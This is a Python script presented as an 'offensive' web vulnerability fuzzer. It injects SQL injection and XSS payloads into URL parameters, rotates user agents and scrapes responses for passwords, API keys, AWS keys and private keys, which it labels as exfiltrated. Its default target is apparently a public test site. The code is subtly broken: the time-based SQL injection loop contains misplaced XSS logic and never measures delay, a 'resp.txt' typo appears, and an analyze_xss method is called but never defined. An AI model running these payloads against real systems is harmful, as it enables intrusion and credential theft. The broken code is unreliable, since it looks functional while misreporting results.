import requests
from urllib.parse import urlparse, parse_qsl, urlencode, urlunparse
import time
import re
import random

class AdvancedWebVulnFuzzerEngine:
    """
    Offensive Web Vulnerability Scanner & Fuzzer Engine.
    Features:
    - Custom Baseline Calibration
    - Error-Based & Time-Based Blind SQL Injection Analysis
    - Context-Aware Reflected XSS Detection
    - Regex-Based Sensitive Data Leak Scraper
    """
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
        
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Version/17.0 Safari/605.1.15",
            "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0"
        ]
        
        self.sqli_error_payloads = ["'", "\"", "' OR 1=1--", "'--", "') OR ('1'='1"]
        self.sqli_time_payloads = ["' AND SLEEP(3)--", "' WAITFOR DELAY '0:0:3'--", "';SELECT PG_SLEEP(3)--"]
        self.xss_payloads = [
            "<script>alert('XSS_TEST')</script>",
            "\"><svg/onload=alert('XSS_TEST')>",
            "javascript:alert('XSS_TEST')"
        ]
        
        self.db_error_signatures = {
            "MySQL": [r"you have an error in your sql syntax", r"warning: mysql_"],
            "PostgreSQL": [r"pg_query\(\): query failed", r"error: length mismatch in string"],
            "Microsoft SQL Server": [r"unclosed quotation mark after the character string", r"driver\]\[sql server\]"],
            "SQLite": [r"sqlite3\.operationalerror", r"unrecognized token:"]
        }
        
        self.leak_patterns = {
            "DB Password Leak": r"(?i)(db_password|database_pass|db_pass)\s*=\s*['\"]([^'\"]+)['\"]",
            "API Key / Secret": r"(?i)(api_key|secret_key|jwt_token)\s*=\s*['\"]([^'\"]+)['\"]",
            "AWS Access Key": r"AKIA[0-9A-Z]{16}",
            "RSA Private Key": r"-----BEGIN RSA PRIVATE KEY-----"
        }

        self.baseline_response_time = 0.0
        self.baseline_content_length = 0
        
    def _get_random_headers(self):
        return {"User-Agent": random.choice(self.user_agents)}
    
    def calibrate_baseline(self):
        print("[*] Calibrating Target Baseline...")
        try:
            start_time = time.time()
            resp = self.session.get(self.target_url, headers=self._get_random_headers(), timeout=10)
            self.baseline_response_time = time.time() - start_time
            self.baseline_content_length = len(resp.content)
            
            print(f"[+] Baseline Set -> Response Time: {self.baseline_response_time:2f}s | Content Size: {self.baseline_content_length} Bytes")
            return True
        except requests.RequestException as e:
            print(f"[!] Baseline Calibration Failed: {e}")
            return False
    
    def build_fuzzed_url(self, param_name, payload):
        parsed = urlparse(self.target_url)
        params = parse_qsl(parsed.query)
        new_params = [(p, payload if p == param_name else v) for p, v in params]
        new_query = urlencode(new_params)
        return urlunparse(parsed._replace(query=new_query))
    
    def analyze_sqli(self, param_name):
        print(f"[*] Testing Parameter [{param_name}] for SQL Injection...")
        
        # Error-Based SQLİ Analyze
        for payload in self.sqli_error_payloads:
            target_fuzzed_url = self.build_fuzzed_url(param_name, payload)
            try:
                resp = self.session.get(target_fuzzed_url, headers=self._get_random_headers(), timeout=10)
                for db_type, patterns in self.db_error_signatures.items():
                    for pattern in patterns:
                        if re.search(pattern, resp.text, re.IGNORECASE):
                            print(f"\n[VULNERABILITY DETECTED: Error-Based SQLİ]")
                            print(f" ├─ Target Parameter : {param_name}")
                            print(f" ├─ Engine Detected  : {db_type}")
                            print(f" ├─ Payload Executed : {payload}\n")
                            break
            except requests.RequestException:
                pass
        
        # Time-Based Blind SQLi Analyze
        for payload in self.sqli_time_payloads:
            target_fuzzed_url = self.build_fuzzed_url(param_name, payload)
            try:
                start_time = time.time()
                resp = self.session.get(target_fuzzed_url, headers=self._get_random_headers(), timeout=10)
                if payload in resp.txt:
                    context = "HTML Body Context"
                    if f'"{payload}"' in resp.text or f"'{payload}'" in resp.text:
                        context = "HTML Attribute Context"
                    elif f"<script>{payload}" in resp.text:
                        context = "Script Execution Context"
                    
                    print(f"\n[🚨 VULNERABILITY DETECTED: Reflected XSS]")
                    print(f" ├─ Target Parameter : {param_name}")
                    print(f" ├─ Injection Context: {context}")
                    print(f" └─ Payload Reflected: {payload}\n")
            except requests.RequestException:
                pass
    
    def scrape_sensitive_data(self, html_content):
        for leak_type, pattern in self.leak_patterns.items():
            matches = re.findall(pattern, html_content)
            if matches:
                print(f"[🚨 SENSITIVE DATA EXFILTRATED: {leak_type}]")
                for match in matches:
                    print(f" └─ Captured Leak Data: {match}")

    def run_fuzzer(self):
        print(f"==================================================")
        print(f" ADVANCED OFFENSIVE WEB VULNERABILITY FUZZER ENGINE")
        print(f" Target Endpoint: {self.target_url}")
        print(f"==================================================")

        if not self.calibrate_baseline():
            return

        parsed = urlparse(self.target_url)
        params = [p[0] for p in parse_qsl(parsed.query)]

        if not params:
            print("[!] Error: No URL query parameters detected for fuzzing.")
            return

        print(f"[+] Discovered Query Parameters ({len(params)}): {params}")

        for param in params:
            self.analyze_sqli(param)
            self.analyze_xss(param)

        try:
            baseline_resp = self.session.get(self.target_url, headers=self._get_random_headers())
            self.scrape_sensitive_data(baseline_resp.text)
        except requests.RequestException:
            pass

        print("[*] Fuzzing Engine Operations Completed.")

if __name__ == "__main__":
    target = "http://testphp.vulnweb.com/artists.php?artist=1"
    fuzzer = AdvancedWebVulnFuzzerEngine(target_url=target)
    fuzzer.run_fuzzer()   

